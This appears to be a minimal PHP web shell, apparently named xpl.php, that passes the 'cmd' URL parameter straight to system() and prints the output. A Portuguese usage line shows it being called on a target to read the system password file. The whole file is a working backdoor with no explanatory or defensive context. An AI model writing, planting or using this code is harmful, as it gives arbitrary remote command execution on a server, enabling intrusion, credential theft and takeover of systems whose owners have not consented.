<?php

if(isset($_GET['cmd'])){

	echo "<pre>";
	$cmd = ($_GET['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}else{

echo "Modo de Usar: target.com/xpl.php?cmd=cat+etc/passwd";

}

?>
